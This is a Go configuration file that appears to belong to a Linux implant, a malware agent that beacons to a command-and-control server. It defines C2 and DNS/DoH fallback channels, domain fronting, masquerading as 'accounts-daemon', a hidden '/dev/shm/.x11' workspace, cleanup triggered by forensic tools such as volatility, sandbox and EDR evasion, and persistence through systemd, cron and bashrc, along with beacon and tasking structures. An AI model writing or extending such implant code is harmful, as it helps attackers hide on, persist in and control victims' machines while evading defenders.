package config

import (
	"crypto/rand"
	"encoding/hex"
	"time"
)

// ImplantConfig holds the embedded configuration for the implant.
// Values are set at compile time via ldflags or embedded defaults.
type ImplantConfig struct {
	// C2 servers (HTTPS primary)
	C2Servers []string
	// DNS C2 fallback domains
	DNSDomains []string
	// DoH resolver endpoints
	DoHResolvers []string
	// Domain fronting host header
	FrontingDomain string
	// Actual C2 host (used with fronting)
	FrontingHost string

	// Beacon timing
	CallbackInterval time.Duration
	Jitter           float64 // 0.0 - 1.0
	MaxRetries       int

	// Crypto
	ServerPubKey []byte // ECDH server public key (P-256)
	PSK          []byte // Pre-shared key for initial config decryption

	// Implant identity
	ImplantID string

	// Namespace config
	TargetHostname string // UTS namespace hostname to spoof
	MountWorkDir   string // tmpfs workspace path inside mount ns

	// Opsec
	MasqueradeName  string   // Process name to masquerade as
	KillSwitchUsers []string // Trigger cleanup if these users log in
	KillSwitchProcs []string // Trigger cleanup if these processes appear
	MaxAliveHours   int      // Auto-cleanup after N hours (0 = unlimited)
	SandboxEvasion  bool     // Enable sandbox/VM detection checks
	EDRAwareness    bool     // Enable EDR detection and behavior adjustment

	// Persistence
	PersistMethods []string // Which persistence methods to install

	// Target-keying guardrails — binary only executes on intended targets
	HostnamePattern string   // regex pattern hostname must match
	AllowedCIDRs    []string // CIDR ranges the host IP must be in
	RequiredMACs    []string // MAC address prefixes that must exist
	MachineIDHash   string   // SHA-256 hash of /etc/machine-id (don't store plaintext)
	CanaryFile      string   // file path that must exist on target
	CanaryHash      string   // SHA-256 hash of canary file contents
	KillDate        string   // "2026-06-01" — implant expires after this date
	DomainPattern   string   // regex pattern that DNS domain must match
}

// Task represents a tasking command from the C2 server.
type Task struct {
	ID   string            `json:"id"`
	Type string            `json:"type"`
	Args map[string]string `json:"args"`
}

// TaskResult represents the result sent back to the C2 server.
type TaskResult struct {
	ID        string `json:"id"`
	ImplantID string `json:"implant_id"`
	Output    []byte `json:"output"`
	Error     string `json:"error,omitempty"`
	Timestamp int64  `json:"timestamp"`
}

// Beacon is the check-in payload sent to the C2 server.
type Beacon struct {
	ImplantID  string        `json:"implant_id"`
	Hostname   string        `json:"hostname"`
	Username   string        `json:"username"`
	UID        int           `json:"uid"`
	PID        int           `json:"pid"`
	OS         string        `json:"os"`
	Arch       string        `json:"arch"`
	InNS       bool          `json:"in_namespace"`
	Interfaces []NetInfo     `json:"interfaces,omitempty"`
	Results    []*TaskResult `json:"results,omitempty"`
}

// BeaconResponse is the response from the C2 server.
type BeaconResponse struct {
	Tasks    []Task  `json:"tasks,omitempty"`
	Sleep    int     `json:"sleep,omitempty"`    // Override sleep in seconds
	Jitter   float64 `json:"jitter,omitempty"`   // Override jitter (0.0-1.0)
	Shutdown bool    `json:"shutdown,omitempty"` // Trigger cleanup
}

// NetInfo holds network interface information.
type NetInfo struct {
	Name  string   `json:"name"`
	Addrs []string `json:"addrs"`
	MAC   string   `json:"mac"`
}

// DefaultConfig returns a configuration with sane defaults.
// In production, these would be overridden at compile time.
func DefaultConfig() *ImplantConfig {
	id, _ := generateID()
	return &ImplantConfig{
		C2Servers:        []string{"https://127.0.0.1:8443/api/v1/beacon"},
		DNSDomains:       []string{"ns1.example.com"},
		DoHResolvers:     []string{"https://1.1.1.1/dns-query"},
		CallbackInterval: 30 * time.Second,
		Jitter:           0.2,
		MaxRetries:       5,
		ImplantID:        id,
		TargetHostname:   "worker-01",
		MountWorkDir:     "/dev/shm/.x11",
		MasqueradeName:   "accounts-daemon",
		KillSwitchUsers:  []string{},
		KillSwitchProcs:  []string{"volatility", "rekall", "lime"},
		MaxAliveHours:    0,
		SandboxEvasion:   true,
		EDRAwareness:     true,
		PersistMethods:   []string{"systemd", "cron", "bashrc"},
		KillDate:         time.Now().AddDate(0, 0, 30).Format("2006-01-02"),
	}
}

func generateID() (string, error) {
	b := make([]byte, 8)
	_, err := rand.Read(b)
	if err != nil {
		return "unknown", err
	}
	return hex.EncodeToString(b), nil
}
